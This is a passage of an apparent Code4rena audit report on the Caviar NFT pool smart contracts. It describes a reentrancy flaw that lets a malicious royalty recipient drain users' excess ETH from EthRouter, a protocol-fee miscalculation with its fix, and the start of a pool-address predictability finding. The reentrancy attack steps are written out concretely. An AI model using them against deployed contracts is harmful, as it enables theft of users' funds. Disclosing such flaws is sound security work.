href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L140-L143\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/EthRouter.sol#L140-L143</a></p>\n<h3 id=\"impact-5\" style=\"position:relative;\"><a href=\"#impact-5\" aria-label=\"impact 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Users that submit single or bulk Buy orders through <code>EthRouter.sol</code> can have their excess eth stolen by a malicious royalty recipient.</p>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><strong>Introduction</strong></p>\n<p>The <code>buy(...)</code> function in <code>PrivatePool.sol</code> refunds excess ether back to <code>EthRouter.sol</code> and\nthen pays a royalty amount to a royalty recipient. The order is the following:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// refund any excess ETH to the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\">) </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">netInputAmount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">payRoyalties</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">recipient</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">royaltyFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>This turns out to be dangerous since now <code>buy(...)</code> in <code>EthRouter.sol</code> can be reentered from the fallback function of a royalty recipient. In the fallback function the attacker would call <code>buy</code> in the <code>EthRouter.sol</code> with an empty <code>Buy[] buys calldata</code>, <code>deadline=0</code> and <code>payRoyalties = false</code> which will skip the <code>for</code> loop in <code>buy(...)</code>, since <code>buys</code> is empty, and would reach the following block of code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// refund any surplus ETH to the caller</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferETH</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Since now <code>msg.sender</code> is the royalty recipient he would receive all the ether that is currently residing in <code>EthRouter.sol</code> while the original <code>buy(...)</code> triggered by the user hasn’t yet finished.</p>\n<p>Before supplying a PoC implementation in Foundry, there are a few caveats to be noted.</p>\n<p>Firstly, this issue can be more easily reproduced by assuming that the malicious royalty recipient would come either from a single <code>Buy</code> order consisting of a single <code>tokenId</code> or multiple <code>Buy</code> orders where the <code>tokenId</code> with the malicious royalty recipient is the last <code>tokenId</code> in the array of the last <code>Buy</code> order. </p>\n<p>In the case of the <code>tokenId</code> associated with the malicious royalty recipient being positioned NOT in last place in the <code>tokenIds[]</code> array in the last <code>Buy</code> order we would have to write a <code>fallback</code> function that after collecting all the ether in <code>EthRouter.sol</code> somehow extracts information of how much ether would be needed to successfully complete the rest of the <code>buy(...)</code> invocations (that will be called on the rest of the <code>tokenIds[]</code>) and sends that ether back to <code>EthRouter.sol</code> so that the whole transaction doesn’t revert due to <code>EthRouter.sol</code> being out of funds. In the presented PoC implementation it is assumed that <code>tokenIds</code> has a single token or the malicious royalty recipient is associated with the last <code>tokenId</code> in the last <code>Buy</code> if there are multiple <code>Buy</code> orders. In the case where <code>tokenId</code> is positioned not in last place a more sophisticated approach would be needed to steal the excess eth that involves inspecting the <code>EthRouter.buy(...)</code> while it resides in the transaction mempool and front-running a transaction that configures a <code>fallback()</code> function in the royalty recipient that would send the necessary amount of the stolen excess eth back to <code>EthRouter.sol</code> so that <code>buy(...)</code> doesn’t revert.</p>\n<p><strong>PoC implementation</strong></p>\n<p>See warden’s <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/569\">original submission</a> for full details.</p>\n<p><strong>Note on severity</strong></p>\n<p>A severity rating of “High” was chosen due to the following:</p>\n<ol>\n<li>Although the current state of the NFT market mostly has adopted NFTs that have royalty payments directly to the creator, the authors of Caviar have acknowledged the ERC-2981 standard and it is assumed they are aware that <code>royaltyInfo</code> returns an arbitrary royalty recipient address.</li>\n<li>The PoC implementation in this report uses an already existing NFT project  - Pixels1024 - deployed on the Polygon network that shows a use case where users are responsible for the creation of a given NFT from a collection and therefore the user-creator is assigned as a royalty recipient.</li>\n<li>It is possible that future projects adopting ERC-2981 could have novel and complex interactions between who creates and who receives royalties in a given collection, therefore, extra caution should be a priority when handling <code>royaltyInfo</code> requests and the current implementation is shown to have а notable vulnerability.</li>\n</ol>\n<h3 id=\"tools-used-5\" style=\"position:relative;\"><a href=\"#tools-used-5\" aria-label=\"tools used 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<ol>\n<li>Foundry</li>\n<li>ERC-2981 specification - <a href=\"https://eips.ethereum.org/EIPS/eip-2981\">https://eips.ethereum.org/EIPS/eip-2981</a></li>\n<li>1024 Pixels NFT - <a href=\"https://github.com/michaelliao/1024pixels/blob/master/contracts/1024pixels.sol\">repo</a>; <a href=\"https://polygonscan.com/address/0x1024accd05fa01adbb74502dbddd8e430d610c53\">polygon</a>;</li>\n</ol>\n<h3 id=\"recommended-mitigation-steps-11\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-11\" aria-label=\"recommended mitigation steps 11 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Rework <code>buy</code> in <code>EthRouter.sol</code> and <code>PrivatePool.sol</code>. Use reentrancy guard.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/752#issuecomment-1518072836\">outdoteth (Caviar) acknowledged via duplicate issue <code>#752</code></a></strong> </p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/569#issuecomment-1529069612\">Alex the Entreprenerd (judge) decreased severity to Medium</a></strong></p>\n<hr>\n<h2 id=\"m-10-incorrect-protocol-fee-is-taken-when-changing-nfts\" style=\"position:relative;\"><a href=\"#m-10-incorrect-protocol-fee-is-taken-when-changing-nfts\" aria-label=\"m 10 incorrect protocol fee is taken when changing nfts permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/463\">[M-10] Incorrect protocol fee is taken when changing NFTs</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/463\">Voyvoda</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/984\">saian</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/973\">GT_Blockchain</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/942\">Josiah</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/872\">CodingNameKiki</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/725\">JGcarv</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/687\">DishWasher</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/601\">neumo</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/305\">RaymondFam</a>, and <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/72\">J4de</a></em></p>\n<p>Incorrect protocol fee is taken when changing NFTs which results in profit loss for the Caviar protocol.</p>\n<h3 id=\"proof-of-concept-10\" style=\"position:relative;\"><a href=\"#proof-of-concept-10\" aria-label=\"proof of concept 10 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The protocol fee in changeFeeQuote is calculated as a percentage of the feeAmount which is based on the input amount:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L737\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L737</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">changeFeeQuote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inputAmount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">Factory</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">).</span><span class=\"mtk11\">protocolFeeRate</span><span class=\"mtk1\">() / </span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>This seems wrong as in buyQuote and sellQuote the protocol fee is calculated as a percentage of the input amount, not the pool fee amount:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L703\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L703</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">buyQuote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">outputAmount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">protocolFeeAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">inputAmount</span><span class=\"mtk1\"> </span><span class=\"mtk4\">*</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Factory</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">).</span><span class=\"mtk11\">protocolFeeRate</span><span class=\"mtk1\">() / 10</span><span class=\"mtk11\">_000</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L721\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L721</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">sellQuote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inputAmount</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">protocolFeeAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">outputAmount</span><span class=\"mtk1\"> </span><span class=\"mtk4\">*</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Factory</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">).</span><span class=\"mtk11\">protocolFeeRate</span><span class=\"mtk1\">() / 10</span><span class=\"mtk11\">_000</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>This makes the protocol fee extremely low meaning a profit loss for the protocol.</p>\n<h3 id=\"recommended-mitigation-steps-12\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-12\" aria-label=\"recommended mitigation steps 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p><code>protocolFeeAmount</code> in changeFeeQuote should be a percentage of the input amount instead of the pool fee.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/463#issuecomment-1518567170\">outdoteth (Caviar) confirmed, but disagreed with severity and commented</a>:</strong></p>\n<blockquote>\n<p>There is no risk of fund loss here. But agree that this is an issue.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/463#issuecomment-1520531536\">outdoteth (Caviar) mitigated</a>:</strong></p>\n<blockquote>\n<p>Fix is here: <a href=\"https://github.com/outdoteth/caviar-private-pools/pull/13\">https://github.com/outdoteth/caviar-private-pools/pull/13</a>.</p>\n<p>Proposed fix is to add a separate fee called protocolChangeFeeRate which can be much higher than protocolFeeRate. For example, protocolChangeFeeRate could be on the order of ~20-30%. For example, if the fixed <code>changeFee</code> is 0.1 ETH, the NFT is worth 1.5 ETH, and the protocolChangeFeeRate is 30%, then the protocol fee would be 0.03 ETH on a change() or flashLoan().</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">changeFeeQuote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">inputAmount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// multiply the changeFee to get the fee per NFT (4 decimals of accuracy)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">exponent</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) ? </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> : </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">() - </span><span class=\"mtk7\">4</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feePerNft</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">changeFee</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk12\">exponent</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">inputAmount</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">feePerNft</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">protocolFeeAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">feeAmount</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">Factory</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">).</span><span class=\"mtk11\">protocolChangeFeeRate</span><span class=\"mtk1\">() / </span><span class=\"mtk7\">10_000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/463#issuecomment-1528971055\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong>\nThe Warden has shown an inconsistency in how protocolFees are computed, because this is limited to a loss of Yield, I believe Medium Severity to be more appropriate.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-11-factorycreate-predictability-of-pool-address-creates-multiple-issues\" style=\"position:relative;\"><a href=\"#m-11-factorycreate-predictability-of-pool-address-creates-multiple-issues\" aria-label=\"m 11 factorycreate predictability of pool address creates multiple issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/419\">[M-11] <code>Factory.create</code>: Predictability of pool address creates multiple issues.</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/419\">AkshaySrivastav</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/989\">sashik_eth</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/980\">saian</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/871\">adriro</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/694\">said</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/661\">fs0c</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/658\">philogy</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/590\">carlitox477</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/583\">holyhansss_kr</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/576\">hasmama</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/567\">juancito</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/464\">Dug</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/457\">GT_Blockchain</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/364\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/357\">hihen</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/329\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/207\">zion</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/173\">dingo2077</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/112\">yixxas</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/92\">0xTheC0der</a>, and <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/48\">Haipls</a></em></p>\n<p>The <code>Factory.create</code> function is responsible for creating new <code>PrivatePool</code>s. It does this using the <code>LibClone.cloneDeterministic</code> function.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">create</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_salt</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> ((</span><span class=\"mtk12\">_baseToken</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">baseTokenAmount</span><span class=\"mtk1\">) || (</span><span class=\"mtk12\">_baseToken</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp; </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span 